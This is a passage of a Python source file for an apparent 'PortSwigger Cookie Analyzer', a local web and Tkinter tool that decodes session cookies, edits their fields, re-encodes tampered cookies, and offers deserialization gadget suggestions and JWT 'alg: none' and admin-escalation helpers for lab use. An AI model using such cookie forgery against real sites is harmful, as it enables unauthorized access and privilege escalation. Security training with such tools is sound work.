<title>PortSwigger Cookie Analyzer</title>
<style>
  :root{{--bg:#0d1117;--panel:#161b22;--border:#30363d;--accent:#58a6ff;--green:#3fb950;--red:#f85149;--text:#c9d1d9;--muted:#8b949e}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--bg);color:var(--text);font-family:'Courier New',monospace;font-size:14px;min-height:100vh}}
  header{{background:var(--panel);border-bottom:1px solid var(--border);padding:12px 24px;display:flex;align-items:center;gap:12px}}
  header h1{{font-size:18px;color:var(--accent);letter-spacing:1px}}
  .badge{{background:#21262d;border:1px solid var(--border);border-radius:4px;padding:2px 8px;font-size:11px;color:var(--muted)}}
  .container{{padding:24px;max-width:1200px;margin:0 auto}}
  .grid{{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px}}
  .card{{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:16px}}
  .card h2{{font-size:13px;color:var(--accent);margin-bottom:12px;text-transform:uppercase;letter-spacing:.5px}}
  label{{display:block;font-size:12px;color:var(--muted);margin-bottom:4px}}
  textarea,input[type=text]{{width:100%;background:#0d1117;border:1px solid var(--border);border-radius:4px;color:var(--text);padding:8px;font-family:inherit;font-size:13px;resize:vertical}}
  textarea{{height:80px}}
  button{{background:var(--accent);color:#0d1117;border:none;border-radius:4px;padding:8px 16px;font-size:13px;font-weight:700;cursor:pointer;transition:opacity .2s}}
  button:hover{{opacity:.85}}
  button.danger{{background:var(--red)}}
  button.success{{background:var(--green)}}
  button.muted{{background:#21262d;color:var(--text);border:1px solid var(--border)}}
  .actions{{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}}
  .detect-result{{margin-top:12px;padding:10px;background:#21262d;border-radius:4px;border-left:3px solid var(--accent)}}
  .detect-result .lang{{font-size:18px;font-weight:700;color:var(--accent)}}
  .detect-result .conf{{font-size:11px;color:var(--muted)}}
  pre{{background:#0d1117;border:1px solid var(--border);border-radius:4px;padding:12px;overflow:auto;max-height:300px;font-size:12px;white-space:pre-wrap;word-break:break-all}}
  .log-box{{height:200px;overflow-y:auto;font-size:11px;color:var(--muted);background:#0d1117;border:1px solid var(--border);border-radius:4px;padding:8px}}
  .log-entry{{padding:1px 0;border-bottom:1px solid #21262d}}
  .status-ok{{color:var(--green)}}
  .status-err{{color:var(--red)}}
  .params-table{{width:100%;border-collapse:collapse}}
  .params-table th,.params-table td{{border:1px solid var(--border);padding:6px 10px;font-size:12px;text-align:left}}
  .params-table th{{background:#21262d;color:var(--accent)}}
  .params-table input{{background:transparent;border:none;color:var(--text);width:100%;outline:none}}
  .result-box{{margin-top:12px;padding:10px;background:#21262d;border-radius:4px}}
  footer{{text-align:center;padding:16px;color:var(--muted);font-size:11px;border-top:1px solid var(--border);margin-top:24px}}
  @media(max-width:768px){{.grid{{grid-template-columns:1fr}}}}
</style>
</head>
<body>
<header>
  <h1>🔐 PortSwigger Cookie Analyzer</h1>
  <span class="badge">v2.0</span>
  <span class="badge" style="color:var(--green)">●&nbsp;LIVE</span>
  <span class="badge">127.0.0.1:{port}</span>
</header>
<div class="container">
  <div class="grid">
    <!-- INPUT -->
    <div class="card">
      <h2>🍪 Cookie Input</h2>
      <label>Incolla il cookie di sessione:</label>
      <textarea id="cookieInput" placeholder="session=BAhvOi... oppure eyJhb... oppure O:8:...">{cookie}</textarea>
      <div class="actions">
        <button onclick="detectCookie()">🔍 Detect & Decode</button>
        <button class="muted" onclick="clearAll()">✕ Clear</button>
      </div>
      <div id="detectResult" class="detect-result" style="display:{show_detect}">
        <div class="lang">{detected_lang}</div>
        <div class="conf">Confidenza: {confidence}% | Metodo: {method}</div>
      </div>
    </div>

    <!-- DECODED PREVIEW -->
    <div class="card">
      <h2>📋 Decoded Preview</h2>
      <pre id="decodedPreview">{preview}</pre>
    </div>
  </div>

  <div class="grid">
    <!-- EDIT PARAMS -->
    <div class="card">
      <h2>✏️ Edit Parameters</h2>
      <table class="params-table" id="paramsTable">
        <tr><th>Key</th><th>Value</th><th>#</th></tr>
        {params_rows}
      </table>
      <div class="actions" style="margin-top:12px">
        <button onclick="addParam()">+ Aggiungi Param</button>
        <button class="success" onclick="reEncode()">🔄 Re-encode</button>
      </div>
      <div id="reencodeResult" class="result-box" style="display:{show_reencode}">
        <label>Cookie Tamperato:</label>
        <pre id="newCookieVal" style="word-break:break-all">{new_cookie}</pre>
        <div class="actions">
          <button onclick="copyCookie()" class="success">📋 Copia</button>
          <button onclick="testRequest()" class="danger">🚀 Test Request</button>
        </div>
      </div>
    </div>

    <!-- GADGET SUGGESTIONS -->
    <div class="card">
      <h2>⚡ Gadget Suggestions</h2>
      <div id="gadgetList">{gadgets_html}</div>
    </div>
  </div>

  <!-- LOG -->
  <div class="card">
    <h2>📜 Log Console</h2>
    <div class="log-box" id="logBox">{log_html}</div>
    <div class="actions" style="margin-top:8px">
      <button class="muted" onclick="refreshLog()">🔄 Refresh</button>
      <button class="muted" onclick="clearLog()">🗑 Clear Log</button>
    </div>
  </div>
</div>
<footer>PortSwigger Cookie Analyzer v2.0 · Solo per uso educativo in ambienti lab · NO execute reale</footer>

<script>
let paramCounter = {param_count};

function detectCookie() {{
  const cookie = document.getElementById('cookieInput').value.trim();
  if (!cookie) {{ alert('⚠ Inserisci un cookie prima!'); return; }}
  fetch('/api/detect', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{cookie: cookie}})
  }}).then(r => r.json()).then(data => {{
    if (data.error && !data.lang) {{
      alert('❌ Errore: ' + data.error);
      return;
    }}
    document.querySelector('.detect-result .lang').textContent = data.lang;
    document.querySelector('.detect-result .conf').textContent =
      'Confidenza: ' + data.confidence + '% | Metodo: ' + data.method;
    document.getElementById('detectResult').style.display = 'block';
    document.getElementById('decodedPreview').textContent = data.preview || '(nessun preview)';
    // Popola params
    if (data.params && data.params.length > 0) {{
      populateParams(data.params);
    }}
    refreshLog();
  }}).catch(e => alert('❌ Errore rete: ' + e));
}}

function populateParams(params) {{
  const tbody = document.getElementById('paramsTable');
  // Rimuovi righe esistenti (lascia header)
  while (tbody.rows.length > 1) tbody.deleteRow(1);
  paramCounter = 0;
  params.forEach(p => addParamRow(p.key, p.value));
}}

function addParamRow(key='', val='') {{
  const table = document.getElementById('paramsTable');
  const id = ++paramCounter;
  const row = table.insertRow(-1);
  row.innerHTML = `<td><input type="text" placeholder="chiave" value="${{escapeHtml(key)}}" id="pk_${{id}}"></td>
    <td><input type="text" placeholder="valore" value="${{escapeHtml(val)}}" id="pv_${{id}}"></td>
    <td><button class="danger" style="padding:3px 8px" onclick="this.closest('tr').remove()">✕</button></td>`;
}}

function addParam() {{ addParamRow(); }}

function escapeHtml(str) {{
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}}

function getParams() {{
  const rows = document.getElementById('paramsTable').rows;
  const params = [];
  for (let i=1; i<rows.length; i++) {{
    const inputs = rows[i].querySelectorAll('input');
    if (inputs.length >= 2 && inputs[0].value.trim()) {{
      params.push({{key: inputs[0].value.trim(), value: inputs[1].value}});
    }}
  }}
  return params;
}}

function reEncode() {{
  const cookie = document.getElementById('cookieInput').value.trim();
  const params = getParams();
  if (!cookie) {{ alert('⚠ Inserisci prima un cookie!'); return; }}
  fetch('/api/reencode', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{cookie: cookie, params: params}})
  }}).then(r => r.json()).then(data => {{
    if (!data.success) {{
      alert('❌ Re-encode fallito: ' + data.error);
      return;
    }}
    document.getElementById('newCookieVal').textContent = data.new_value;
    document.getElementById('reencodeResult').style.display = 'block';
    refreshLog();
  }}).catch(e => alert('❌ Errore: ' + e));
}}

function copyCookie() {{
  const val = document.getElementById('newCookieVal').textContent;
  navigator.clipboard.writeText(val).then(() => alert('✅ Cookie copiato negli appunti!'))
    .catch(() => {{
      const ta = document.createElement('textarea');
      ta.value = val; document.body.appendChild(ta);
      ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
      alert('✅ Cookie copiato!');
    }});
}}

function testRequest() {{
  const cookie = document.getElementById('newCookieVal').textContent.trim();
  if (!cookie) {{ alert('⚠ Nessun cookie tamperato da testare'); return; }}
  fetch('/api/test', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{cookie: cookie}})
  }}).then(r => r.json()).then(data => {{
    alert((data.success ? '✅ ' : '⚠ ') + (data.message || JSON.stringify(data)));
    refreshLog();
  }}).catch(e => alert('❌ Errore test: ' + e));
}}

function clearAll() {{
  document.getElementById('cookieInput').value = '';
  document.getElementById('decodedPreview').textContent = '';
  document.getElementById('detectResult').style.display = 'none';
  document.getElementById('reencodeResult').style.display = 'none';
  while (document.getElementById('paramsTable').rows.length > 1)
    document.getElementById('paramsTable').deleteRow(1);
}}

function refreshLog() {{
  fetch('/api/log').then(r => r.json()).then(data => {{
    const box = document.getElementById('logBox');
    box.innerHTML = data.log.map(l => `<div class="log-entry">${{escapeHtml(l)}}</div>`).join('');
    box.scrollTop = box.scrollHeight;
  }}).catch(() => {{}});
}}

function clearLog() {{
  fetch('/api/log/clear', {{method:'POST'}}).then(() => refreshLog());
}}

// Aggiungi gadget al cookie
function applyGadget(payload, name) {{
  if (!payload) {{ alert('ℹ ' + name + ': usa la tab Edit Params nella GUI o seguì le istruzioni nella descrizione.'); return; }}
  document.getElementById('cookieInput').value = 'session=' + payload;
  alert('✅ Gadget "' + name + '" caricato! Clicca "Detect & Decode" per analizzare.');
}}

// Auto-refresh log ogni 3s
setInterval(refreshLog, 3000);
window.onload = function() {{ refreshLog(); }};
</script>
</body>
</html>"""


def build_html_page(state: dict) -> str:
    """Genera la pagina HTML con lo stato corrente."""
    det = state.get("detected", {}) or {}
    params = state.get("params", []) or []

    params_rows = ""
    for i, p in enumerate(params):
        k = p.get("key", "").replace('"', '&quot;')
        v = str(p.get("value", "")).replace('"', '&quot;')
        params_rows += f'<tr><td><input type="text" id="pk_{i+1}" value="{k}"></td><td><input type="text" id="pv_{i+1}" value="{v}"></td><td><button class="danger" style="padding:3px 8px" onclick="this.closest(\'tr\').remove()">✕</button></td></tr>\n'

    gadgets_html = ""
    lang = det.get("lang", "Unknown")
    suggestions = GADGET_SUGGESTIONS.get(lang, [])
    if suggestions:
        for g in suggestions:
            payload_js = f'"{g["payload"]}"' if g.get("payload") else "null"
            gadgets_html += f"""<div style="margin-bottom:10px;padding:8px;background:#21262d;border-radius:4px">
  <div style="font-weight:700;color:#58a6ff;margin-bottom:4px">{g['name']}</div>
  <div style="font-size:11px;color:#8b949e;margin-bottom:6px">{g['desc']}</div>
  <button onclick="applyGadget({payload_js}, '{g['name'].replace("'", "")}')" class="muted" style="font-size:11px;padding:4px 10px">Applica</button>
</div>"""
    else:
        gadgets_html = f'<div style="color:var(--muted);font-size:12px">Nessun gadget disponibile per {lang}.<br>Inserisci e analizza un cookie prima.</div>'

    log_html = ""
    for entry in reversed(CURRENT_STATE["log"][-50:]):
        cls = "status-err" if ("❌" in entry or "ERRORE" in entry.upper()) else ("status-ok" if ("✅" in entry or "OK" in entry.upper()) else "")
        safe_entry = entry.replace("<", "&lt;").replace(">", "&gt;")
        log_html += f'<div class="log-entry {cls}">{safe_entry}</div>\n'

    cookie_val = state.get("raw_cookie", "").replace("<", "&lt;").replace(">", "&gt;")
    preview    = (det.get("preview") or "").replace("<", "&lt;").replace(">", "&gt;")[:3000]
    new_cookie = state.get("new_cookie", "").replace("<", "&lt;").replace(">", "&gt;")

    return WEB_HTML_TEMPLATE.format(
        port=WEB_PORT,
        cookie=cookie_val,
        show_detect="block" if det.get("lang") else "none",
        detected_lang=det.get("lang", ""),
        confidence=det.get("confidence", 0),
        method=det.get("method", ""),
        preview=preview,
        params_rows=params_rows,
        param_count=len(params),
        show_reencode="block" if new_cookie else "none",
        new_cookie=new_cookie,
        gadgets_html=gadgets_html,
        log_html=log_html,
    )


def extract_params_from_detection(det: dict) -> list:
    """Estrae key-value pairs dal preview per la tabella params - per TUTTI i formati."""
    lang = det.get("lang", "")
    params = []
    preview = det.get("preview", "")
    raw_bytes = det.get("raw_bytes", b"")
    try:
        if "JSON" in lang:
            obj = json.loads(det.get("preview", "{}"))
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if isinstance(v, dict):
                        for kk, vv in v.items():
                            params.append({"key": kk, "value": str(vv)})
                    else:
                        params.append({"key": k, "value": str(v)})
        elif lang == "JWT":
            try:
                jwt_data = json.loads(preview)
                for section in ("header", "payload"):
                    for k, v in jwt_data.get(section, {}).items():
                        params.append({"key": k, "value": str(v)})
            except Exception:
                pass
        elif "PHP" in lang:
            try:
                php_src = raw_bytes.decode("utf-8", errors="replace") if raw_bytes else preview
                php_data = _php_unserialize_simple(php_src)
                if isinstance(php_data, dict):
                    _flatten_dict(php_data, params)
            except Exception:
                pass
        elif lang == "Key=Value / URL-encoded":
            for line in preview.strip().splitlines():
                if "=" in line:
                    k, v = line.strip().split("=", 1)
                    params.append({"key": k.strip(), "value": v.strip()})
        elif lang == "Java Serialized":
            # Usa il parser binario diretto
            if raw_bytes:
                field_names  = _java_extract_field_names(raw_bytes)
                field_values = _java_extract_field_values(raw_bytes)
                if field_names and field_values:
                    for name, fv in zip(field_names, field_values):
                        params.append({"key": name, "value": fv["value"]})
                    # Extra values senza nome
                    for fv in field_values[len(field_names):]:
                        params.append({"key": f"field_{len(params)}", "value": fv["value"]})
                elif field_values:
                    for i, fv in enumerate(field_values):
                        params.append({"key": f"field_{i}", "value": fv["value"]})
        elif lang == "Ruby Marshal":
            if raw_bytes:
                fields = _ruby_extract_fields(raw_bytes)
                for f in fields:
                    params.append({"key": f["key"], "value": f["value"]})
    except Exception as e:
        log_event(f"⚠ extract_params: {e}")
    return params


def _flatten_dict(d: dict, out: list, prefix=""):
    for k, v in d.items():
        if k in ("__class__", "__props__"):
            continue
        if isinstance(v, dict):
            _flatten_dict(v, out, prefix + str(k) + ".")
        else:
            out.append({"key": (prefix + str(k)).lstrip("."), "value": str(v) if v is not None else ""})


class CookieAnalyzerHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass  # Silenzia log HTTP di default

    def _send_json(self, data: dict, code: int = 200):
        body = json.dumps(data, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def _send_html(self, html: str):
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_json_body(self) -> dict:
        length = int(self.headers.get("Content-Length", 0))
        if length == 0:
            return {}
        raw = self.rfile.read(length)
        return json.loads(raw.decode("utf-8"))

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            html = build_html_page(CURRENT_STATE)
            self._send_html(html)
            log_event("🌐 Web UI richiesta da browser")
        elif self.path == "/api/log":
            self._send_json({"log": CURRENT_STATE["log"][-100:]})
        elif self.path == "/api/state":
            safe = {k: v for k, v in CURRENT_STATE.items() if k != "log"}
            self._send_json(safe)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not found")

    def do_POST(self):
        try:
            if self.path == "/api/detect":
                body = self._read_json_body()
                cookie = body.get("cookie", "").strip()
                if not cookie:
                    self._send_json({"error": "Cookie vuoto", "lang": None}, 400)
                    return
                CURRENT_STATE["raw_cookie"] = cookie
                det = detect_language(cookie)
                CURRENT_STATE["detected"] = det
                params = extract_params_from_detection(det)
                CURRENT_STATE["params"] = params
                log_event(f"🔍 Rilevato: {det['lang']} (confidenza {det['confidence']}%) | {det['method']}")
                if det.get("error"):
                    log_event(f"⚠ Avviso detection: {det['error']}")
                self._send_json({
                    "lang": det["lang"],
                    "confidence": det["confidence"],
                    "method": det["method"],
                    "preview": det.get("preview", ""),
                    "error": det.get("error"),
                    "params": params,
                })

            elif self.path == "/api/reencode":
                body = self._read_json_body()
                cookie  = body.get("cookie", "").strip()
                params  = body.get("params", [])
                lang    = CURRENT_STATE.get("detected", {}).get("lang", "Unknown")
                if not cookie:
                    self._send_json({"success": False, "error": "Cookie vuoto"}, 400)
                    return
                result = reencode_cookie(cookie, params, lang)
                if result["success"]:
                    CURRENT_STATE["new_cookie"] = result["new_value"]
                    CURRENT_STATE["params"] = params
                    log_event(f"✅ Re-encode OK per {lang} → {result['new_value'][:80]}...")
                else:
                    log_event(f"❌ Re-encode fallito: {result['error']}")
                self._send_json(result)

            elif self.path == "/api/test":
                body = self._read_json_body()
                cookie = body.get("cookie", "").strip()
                log_event(f"🚀 Test request con cookie: {cookie[:60]}...")
                # Simula test (non esegue comandi reali)
                self._send_json({
                    "success": True,
                    "message": f"Cookie pronto per uso in Burp/browser.\n→ Copia e incolla negli strumenti di sviluppo o in Burp Suite.\n\nCookie: {cookie[:100]}{'...' if len(cookie) > 100 else ''}",
                })

            elif self.path == "/api/log/clear":
                LOG_BUFFER.clear()
                CURRENT_STATE["log"] = []
                self._send_json({"ok": True})

            else:
                self.send_response(404)
                self.end_headers()

        except json.JSONDecodeError as e:
            log_event(f"❌ JSON decode error nella request: {e}")
            self._send_json({"error": f"JSON non valido: {e}"}, 400)
        except Exception as e:
            log_event(f"❌ Errore server: {e}")
            self._send_json({"error": str(e)}, 500)


def start_web_server():
    """Avvia il server HTTP in background."""
    try:
        socketserver.TCPServer.allow_reuse_address = True
        with socketserver.TCPServer((PROXY_HOST, WEB_PORT), CookieAnalyzerHandler) as httpd:
            log_event(f"✅ Web server avviato su http://{PROXY_HOST}:{WEB_PORT}")
            httpd.serve_forever()
    except OSError as e:
        log_event(f"❌ Web server error (porta {WEB_PORT} occupata?): {e}")


# ─── GUI TKINTER ───────────────────────────────────────────────────────────────

class CookieAnalyzerGUI:

    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title(APP_TITLE)
        self.root.geometry("1000x750")
        self.root.minsize(800, 600)
        self._setup_theme()
        self._build_ui()
        self._start_log_refresh()
        log_event("🚀 GUI avviata")

    # ── TEMA ─────────────────────────────────────────────────────────────────

    def _setup_theme(self):
        style = ttk.Style(self.root)
        try:
            style.theme_use("clam")
        except Exception:
            pass
        BG     = "#0d1117"
        PANEL  = "#161b22"
        BORDER = "#30363d"
        FG     = "#c9d1d9"
        ACC    = "#58a6ff"
        SEL    = "#21262d"
        FONT   = ("Consolas", 10)

        self.root.configure(bg=BG)
        style.configure(".",            background=BG,    foreground=FG,   font=FONT)
        style.configure("TFrame",       background=BG)
        style.configure("TLabel",       background=BG,    foreground=FG,   font=FONT)
        style.configure("TButton",      background=ACC,   foreground=BG,   font=("Consolas",10,"bold"), padding=6)
        style.map("TButton",            background=[("active","#1f6feb")])
        style.configure("Danger.TButton", background="#f85149", foreground=BG, font=("Consolas",10,"bold"))
        style.configure("Success.TButton", background="#3fb950", foreground=BG, font=("Consolas",10,"bold"))
        style.configure("Muted.TButton", background=SEL,   foreground=FG,   font=FONT)
        style.configure("TNotebook",    background=PANEL, borderwidth=0)
        style.configure("TNotebook.Tab",background=SEL,   foreground=FG,   font=FONT, padding=[12,6])
        style.map("TNotebook.Tab",      background=[("selected",BG)], foreground=[("selected",ACC)])
        style.configure("TEntry",       fieldbackground=BG, foreground=FG, font=FONT)
        style.configure("TScrollbar",   background=BORDER, troughcolor=BG)
        style.configure("Treeview",     background=BG, foreground=FG, fieldbackground=BG, font=FONT)
        style.configure("Treeview.Heading", background=PANEL, foreground=ACC, font=("Consolas",10,"bold"))
        style.configure("TSeparator",   background=BORDER)
        self._colors = {"bg": BG, "panel": PANEL, "border": BORDER, "fg": FG, "acc": ACC}

    # ── BUILD UI ──────────────────────────────────────────────────────────────

    def _build_ui(self):
        c = self._colors
        # TOP BAR
        top = tk.Frame(self.root, bg=c["panel"], pady=8, padx=16)
        top.pack(fill="x", side="top")
        tk.Label(top, text="🔐 PortSwigger Cookie Analyzer v2.0",
                 bg=c["panel"], fg=c["acc"], font=("Consolas",14,"bold")).pack(side="left")
        tk.Label(top, text=f"● http://127.0.0.1:{WEB_PORT}",
                 bg=c["panel"], fg="#3fb950", font=("Consolas",10)).pack(side="right", padx=10)

        # COOKIE INPUT
        inp_frame = tk.LabelFrame(self.root, text=" 🍪 Cookie di Sessione ",
                                  bg=c["bg"], fg=c["acc"], font=("Consolas",10,"bold"),
                                  pady=8, padx=12, bd=1, relief="solid")
        inp_frame.pack(fill="x", padx=12, pady=(8,0))

        self.cookie_var = tk.StringVar()
        cookie_entry = tk.Entry(inp_frame, textvariable=self.cookie_var,
                                bg=c["bg"], fg=c["fg"], insertbackground=c["fg"],
                                font=("Consolas",10), relief="flat", bd=0)
        cookie_entry.pack(fill="x", ipady=6, padx=4, pady=4)
        cookie_entry.bind("<Return>", lambda e: self.do_detect())

        btn_row = tk.Frame(inp_frame, bg=c["bg"])
        btn_row.pack(fill="x", padx=4, pady=(0,4))
        ttk.Button(btn_row, text="🔍 Detect & Decode", command=self.do_detect).pack(side="left", padx=4)
        ttk.Button(btn_row, text="📋 Paste", command=self._paste_cookie).pack(side="left", padx=4)
        ttk.Button(btn_row, text="✕ Clear", command=self._clear_all, style="Muted.TButton").pack(side="left", padx=4)
        self.detect_label = tk.Label(btn_row, text="", bg=c["bg"], fg=c["acc"],
                                     font=("Consolas",10,"bold"))
        self.detect_label.pack(side="right", padx=8)

        # NOTEBOOK TABS
        self.nb = ttk.Notebook(self.root)
        self.nb.pack(fill="both", expand=True, padx=12, pady=8)

        self._build_tab_decode()
        self._build_tab_edit()
        self._build_tab_generate()
        self._build_tab_proxy()
        self._build_tab_gadgets()
        self._build_tab_ysoserial()
        self._build_tab_log()

    def _make_tab(self, label: str) -> tk.Frame:
        frame = tk.Frame(self.nb, bg=self._colors["bg"])
        self.nb.add(frame, text=label)
        return frame

    # ── TAB 1: DECODE ─────────────────────────────────────────────────────────

    def _build_tab_decode(self):
        f = self._make_tab("📋 Decode / Inspect")
        c = self._colors

        info_row = tk.Frame(f, bg=c["bg"])
        info_row.pack(fill="x", padx=12, pady=(10,4))
        tk.Label(info_row, text="Linguaggio:", bg=c["bg"], fg=c["fg"],
                 font=("Consolas",10)).pack(side="left")
        self.lang_label = tk.Label(info_row, text="—", bg=c["bg"], fg=c["acc"],
                                   font=("Consolas",12,"bold"))
        self.lang_label.pack(side="left", padx=8)
        self.conf_label = tk.Label(info_row, text="", bg=c["bg"], fg="#8b949e",
                                   font=("Consolas",9))
        self.conf_label.pack(side="left")

        self.decode_text = scrolledtext.ScrolledText(
            f, bg=c["bg"], fg=c["fg"], insertbackground=c["fg"],
            font=("Consolas",10), wrap="word", relief="flat", bd=0,
            highlightbackground=c["border"], highlightthickness=1
        )
        self.decode_text.pack(fill="both", expand=True, padx=12, pady=8)

        btn_r = tk.Frame(f, bg=c["bg"])
        btn_r.pack(fill="x", padx=12, pady=(0,8))
        ttk.Button(btn_r, text="🔍 Analizza", command=self.do_detect).pack(side="left", padx=4)
        ttk.Button(btn_r, text="💾 Salva Preview", command=self._save_preview,
                   style="Muted.TButton").pack(side="left", padx=4)

    # ── TAB 2: EDIT PARAMS ────────────────────────────────────────────────────

    def _build_tab_edit(self):
        f = self._make_tab("✏️ Edit Params")
        c = self._colors

        # Info banner
        info_bar = tk.Frame(f, bg="#1c2128", pady=4, padx=12)
        info_bar.pack(fill="x")
        tk.Label(info_bar,
                 text="💡 Doppio click su una riga o clicca ✏ per modificare · Poi clicca ✅ Salva · Poi Re-Encode",
                 bg="#1c2128", fg="#8b949e", font=("Consolas",9)).pack(side="left")

        # Treeview con colonna azione
        cols = ("key", "value", "edit")
        tree_frame = tk.Frame(f, bg=c["bg"])
        tree_frame.pack(fill="both", expand=True, padx=12, pady=(6,0))

        self.param_tree = ttk.Treeview(tree_frame, columns=cols, show="headings", selectmode="browse")
        self.param_tree.heading("key",   text="🔑  Chiave (Key)")
        self.param_tree.heading("value", text="📝  Valore (Value)")
        self.param_tree.heading("edit",  text="Azione")
        self.param_tree.column("key",   width=200, minwidth=100)
        self.param_tree.column("value", width=380, minwidth=150)
        self.param_tree.column("edit",  width=70,  minwidth=70, anchor="center")
        vsb = ttk.Scrollbar(tree_frame, orient="vertical", command=self.param_tree.yview)
        self.param_tree.configure(yscrollcommand=vsb.set)
        self.param_tree.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")
        self.param_tree.bind("<Double-1>", self._on_param_double_click)
        self.param_tree.bind("<Button-1>", self._on_param_click)

        # ── Pannello di modifica inline ──────────────────────────────────────
        edit_outer = tk.Frame(f, bg=c["border"], pady=1)
        edit_outer.pack(fill="x", padx=12, pady=4)
        edit_f = tk.Frame(edit_outer, bg="#161b22", pady=8, padx=12)
        edit_f.pack(fill="x")

        # Titolo pannello
        title_row = tk.Frame(edit_f, bg="#161b22")
        title_row.pack(fill="x", pady=(0,6))
        self.edit_title = tk.Label(title_row, text="✏  Modifica Parametro",
                                   bg="#161b22", fg=c["acc"], font=("Consolas",10,"bold"))
        self.edit_title.pack(side="left")
        self.edit_type_badge = tk.Label(title_row, text="", bg="#21262d", fg="#8b949e",
                                        font=("Consolas",9), padx=6, pady=2)
        self.edit_type_badge.pack(side="left", padx=8)

        # Key row
        row1 = tk.Frame(edit_f, bg="#161b22")
        row1.pack(fill="x", pady=2)
        tk.Label(row1, text="Key:", bg="#161b22", fg="#8b949e",
                 font=("Consolas",10), width=7, anchor="e").pack(side="left")
        self.edit_key_var = tk.StringVar()
        self.edit_key_entry = tk.Entry(row1, textvariable=self.edit_key_var,
                 bg=c["bg"], fg=c["fg"], insertbackground=c["acc"],
                 font=("Consolas",10), relief="flat",
                 highlightbackground=c["border"], highlightthickness=1, state="normal")
        self.edit_key_entry.pack(side="left", fill="x", expand=True, ipady=5, padx=(4,0))

        # Value row
        row2 = tk.Frame(edit_f, bg="#161b22")
        row2.pack(fill="x", pady=2)
        tk.Label(row2, text="Value:", bg="#161b22", fg="#8b949e",
                 font=("Consolas",10), width=7, anchor="e").pack(side="left")
        self.edit_val_var = tk.StringVar()
        self.edit_val_entry = tk.Entry(row2, textvariable=self.edit_val_var,
                 bg=c["bg"], fg="#3fb950", insertbackground=c["acc"],
                 font=("Consolas",11,"bold"), relief="flat",
                 highlightbackground="#3fb950", highlightthickness=1)
        self.edit_val_entry.pack(side="left", fill="x", expand=True, ipady=5, padx=(4,0))
        self.edit_val_entry.bind("<Return>", lambda e: self._update_param())

        # Azione buttons
        act_row = tk.Frame(edit_f, bg="#161b22")
        act_row.pack(fill="x", pady=(6,0))
        self._save_btn = ttk.Button(act_row, text="✅  Salva Modifica", command=self._update_param,
                                    style="Success.TButton")
        self._save_btn.pack(side="left", padx=(0,8))
        ttk.Button(act_row, text="↩ Annulla", command=self._cancel_edit,
                   style="Muted.TButton").pack(side="left")
        self.edit_status = tk.Label(act_row, text="", bg="#161b22", fg="#3fb950",
                                    font=("Consolas",9))
        self.edit_status.pack(side="left", padx=12)

        # ── Bottom action bar ────────────────────────────────────────────────
        btn_r = tk.Frame(f, bg=c["bg"])
        btn_r.pack(fill="x", padx=12, pady=(0,8))
        ttk.Button(btn_r, text="+ Aggiungi Param", command=self._add_param_dialog).pack(side="left", padx=4)
        ttk.Button(btn_r, text="🗑 Rimuovi Selezionato", command=self._remove_param,
                   style="Danger.TButton").pack(side="left", padx=4)
        ttk.Button(btn_r, text="🔄 Reload dal Cookie",
                   command=self.do_detect, style="Muted.TButton").pack(side="left", padx=4)
        ttk.Button(btn_r, text="⚡ Re-Encode →",
                   command=self.do_reencode).pack(side="right", padx=4)

    # ── TAB 3: GENERATE ───────────────────────────────────────────────────────

    def _build_tab_generate(self):
        f = self._make_tab("⚡ Generate / Export")
        c = self._colors

        tk.Label(f, text="Cookie Tamperato (re-encoded):", bg=c["bg"], fg=c["acc"],
                 font=("Consolas",10,"bold")).pack(anchor="w", padx=12, pady=(12,4))

        self.gen_text = scrolledtext.ScrolledText(
            f, bg=c["bg"], fg="#3fb950", insertbackground=c["fg"],
            font=("Consolas",11), wrap="word", relief="flat", bd=0,
            highlightbackground=c["border"], highlightthickness=1, height=6
        )
        self.gen_text.pack(fill="x", padx=12, pady=4)

        btn_r = tk.Frame(f, bg=c["bg"])
        btn_r.pack(fill="x", padx=12, pady=4)
        ttk.Button(btn_r, text="🔄 Re-Encode", command=self.do_reencode).pack(side="left", padx=4)
        ttk.Button(btn_r, text="📋 Copia Cookie", command=self._copy_generated,
                   style="Success.TButton").pack(side="left", padx=4)
        ttk.Button(btn_r, text="💾 Salva su file", command=self._export_cookie,
                   style="Muted.TButton").pack(side="left", padx=4)

        # JWT none attack helper
        jwt_f = tk.LabelFrame(f, text=" 🔑 JWT Helpers ",
                               bg=c["bg"], fg=c["acc"], font=("Consolas",10,"bold"),
                               pady=8, padx=10, bd=1, relief="solid")
        jwt_f.pack(fill="x", padx=12, pady=(12,4))
        jwt_btn_r = tk.Frame(jwt_f, bg=c["bg"])
        jwt_btn_r.pack(fill="x")
        ttk.Button(jwt_btn_r, text="alg: none", command=self._jwt_none_attack,
                   style="Danger.TButton").pack(side="left", padx=4)
        ttk.Button(jwt_btn_r, text="isAdmin: true", command=self._jwt_isadmin,
                   style="Danger.TButton").pack(side="left", padx=4)
        ttk.Button(jwt_btn_r, text="role: admin", command=self._jwt_role_admin,
